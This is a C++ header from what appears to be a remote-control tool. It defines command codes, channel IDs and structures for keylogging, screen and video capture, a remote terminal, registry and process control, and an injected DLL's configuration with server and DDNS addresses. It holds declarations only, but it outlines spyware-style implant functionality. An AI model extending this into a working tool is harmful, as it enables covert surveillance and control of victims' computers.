/*
*	公共变量,函数定义
*/
#pragma once
#include "resource.h"

//消息定义
#define WM_ADDCLIENT			WM_USER + 401		//增加客户
#define WM_MYITEMCHANGED		WM_USER + 402		//项目变化
#define WM_CLIENTMAINRCLICK		WM_USER + 405		//用户右击鼠标
#define WM_RESIZE_WND			WM_USER + 408		//重新排列项目
#define WM_LOGINSUCCESS			WM_USER + 424		//登录完成
#define WM_CLOSEITEM			WM_USER + 604		//客户关闭

//交易代码
#define CLIENT_SYSTEM_RESTART	1020				//重启客户机器
#define CLIENT_SYSTEM_SHUTDOWN	1021				//关闭客户机器
#define CLIENT_PRO_UNINSTALL	1022				//卸载客户程序
#define CLIENT_MODIFY_INFO		1023				//更改客户信息
#define CLIENT_LOGIN_SUCCESS	1024				//签到成功
#define CLIENT_FRAME_START		1028				//开始屏幕拷贝
#define CLIENT_FILES_START		1029				//开始机器管理
#define CLIENT_KEYMON_START		1032				//开始键盘监控
#define CLIENT_TLNT_START		1033				//开始超级终端
#define CLIENT_REGEDIT_START	1034				//开始注册表管理
#define CLIENT_PROC_START		1035				//开始进程管理
#define CLIENT_SERVICE_START	1036				//开始服务管理
#define CLIENT_MULIT_START		1037				//开始视音频管理
#define CLIENT_PROXY			1038				//开始代理服务

#define CONN_MAIN				3000				//控制连接
#define CONN_FILE_UP			3004				//上传文件
#define CONN_FILE_DL			3005				//下载文件

#define CONN_FILE_MANA_SEND		4001				//文件管理发送管道
#define CONN_FILE_MANA_RECV		4002				//文件管理接收管道
#define CONN_FILE_FRAM_SEND		4003				//屏幕监控发送管道
#define CONN_FILE_FRAM_RECV		4004				//屏幕监控接收管道
#define CONN_FILE_TLNT_SEND		4005				//超级终端发送管道
#define CONN_FILE_TLNT_RECV		4006				//超级终端接收管道
#define CONN_FILE_REGD_SEND		4007				//注册表编辑发送管道
#define CONN_FILE_REGD_RECV		4008				//注册表编辑接收管道
#define CONN_FILE_PROC_SEND		4009				//进程管理发送管道
#define CONN_FILE_PROC_RECV		4010				//进程管理接收管道
#define CONN_FILE_SERV_SEND		4011				//服务管理发送管道
#define CONN_FILE_SERV_RECV		4012				//服务管理接收管道
#define CONN_FILE_KEYM_SEND		4013				//键盘监控发送管道
#define CONN_FILE_KEYM_RECV		4014				//键盘监控接收管道
#define CONN_FILE_MULT_SEND		4015				//视频监控发送管道
#define CONN_FILE_MULT_RECV		4016				//视频监控接收管道

typedef enum tagWin32SysType{
   Windows32s,
   WindowsNT3,
   Windows95,
   Windows98,
   WindowsME,
   WindowsNT4,
   Windows2000,
   WindowsXP,
   Windows2003
}Win32SysType;

typedef struct _MYLISTFILEINFO_
{
	HWND	hWnd;
	UINT	m_FileLen;
	UINT	m_FilePoint;
	BOOL	m_IsExec;
	char	m_LocalFile[256];
	char	m_RemoteFile[256];
}MYLISTFILEINFO,*LPMYLISTFILEINFO;

typedef struct _GOLBALVALUE_
{
	BOOL	m_IsMainExit;
	HWND	m_MainhWnd;
	char	m_UserName[256];
	char	m_UserPass[256];
	int		m_Response;
}GOLBALVALUE,*LPGOLBALVALUE;

typedef struct _CMDINFO_
{
	UINT m_Command;
	UINT m_DataLen;
}CMDINFO,*LPCMDINFO;

typedef struct _SOCKETINFO_
{
	SOCKET s;
	HANDLE thread;
}SOCKETINFO,*LPSOCKETINFO;

typedef struct _LOGINSUCCESS_
{
	UINT m_Socket;
	char m_Ip[20];
}LOGINSUCCESS,*LPLOGINSUCCESS;

typedef struct _LOGININFO_
{
	UINT m_CpuSpeed;			//CPU主频
	UINT m_MemContent;			//内存容量
	char ID[17];				//唯一标识
	char m_PcName[64];			//计算机名称
	char m_SysType;				//操作系统类型
	char m_CpuCount;			//CPU数量
	char m_UserName[38];		//用户名称
}LOGININFO,*LPLOGININFO;

typedef struct _CLIENTITEM_
{
	time_t		m_LoginTime;
	char		m_Title[256];
	SOCKET		m_WorkSocket;
	LOGININFO	m_SysInfo;
}CLIENTITEM,*LPCLIENTITEM;

typedef struct _INITDLLINFO_
{
	WORD m_ServerPort;
	UINT m_ProcessId;
	UINT m_DllFileLen;
	char m_ProcessName[128];
	char m_KeyName[24];
	char m_CtrlFile[128];
	char m_StartFile[128];
	char m_ServerAddr[128];
	char m_ParentFile[256];
	char m_EventName[32];
	char m_DdnsUrl[128];
	char m_BakUrl[128];
	char m_IsUpdate;
	char m_ext[511];
	char m_reserved[4];	//added by zhangyl to omit stack corruptions
}INITDLLINFO,*LPINITDLLINFO;

UINT WINAPI MyMainThread(LPVOID lPvoid);
UINT WINAPI MyChildThread(LPVOID lPvoid);

int  AcceptClientMain(SOCKET s,LPCLIENTITEM pData);
BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
void TransParentDC(CRect rect,CDC * pDC);
BOOL ExecCmd(SOCKET s, UINT Command,int len);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
BOOL GetValue(char * SrcStr,char * DesStr,char *Value);
BOOL MakeFilePath(char *pathName);
void GetMyFilePath(char* FileName);
void GetIniFileName(char* pFile);
bool CopySocket(HWND hWnd, SOCKET s, DWORD nInfo);
SOCKET StartTcp(WORD Port);

